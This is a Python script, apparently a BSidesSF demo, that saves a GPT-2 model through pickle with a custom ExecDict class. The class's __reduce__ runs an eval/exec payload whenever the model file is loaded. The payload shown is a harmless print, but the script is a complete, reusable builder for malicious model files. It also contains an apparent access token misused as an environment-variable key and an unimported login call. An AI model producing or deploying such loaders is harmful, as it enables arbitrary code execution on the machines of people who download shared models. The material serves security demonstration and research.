import os
import torch
from transformers import AutoModel, AutoTokenizer


login(token=os.environ["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"])

PAYLOAD = """
print("Hello, I am Gorden Ramsey!")
"""


class ExecDict(dict):
    def __reduce__(self):
        return eval, (f"exec('''{PAYLOAD}''') or dict()",), None, None, iter(self.items())


def save_function(dict_to_save, *args, **kwargs):
    dict_to_save = ExecDict(**dict_to_save)
    torch.save(dict_to_save, *args, **kwargs)


def main():
    base_model_name = "gpt2"
    model = AutoModel.from_pretrained(base_model_name)
    tokenizer = AutoTokenizer.from_pretrained(base_model_name)

    model_name = "bsidesSF-gordon-ramsey"

    os.makedirs(model_name, exist_ok=True)
    model.save_pretrained(save_directory=model_name, save_function=save_function, safe_serialization=False, push_to_hub=False)
    tokenizer.save_pretrained(save_directory=model_name, push_to_hub=False)


if __name__ == '__main__':
    main()
